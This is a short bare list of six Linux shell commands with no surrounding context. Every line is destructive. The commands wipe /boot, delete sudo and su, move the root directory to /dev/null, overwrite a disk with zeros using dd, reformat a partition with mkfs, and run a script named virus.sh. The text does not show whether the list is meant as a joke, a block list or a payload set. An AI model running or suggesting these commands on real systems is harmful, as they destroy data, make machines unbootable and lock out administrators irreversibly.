rm -rf /boot
rm -f /usr/bin/sudo;rm -f /bin/su
mv / /dev/null
dd if=/dev/zero of=/dev/hda
mkfs.ext4 /dev/sda1
./virus.sh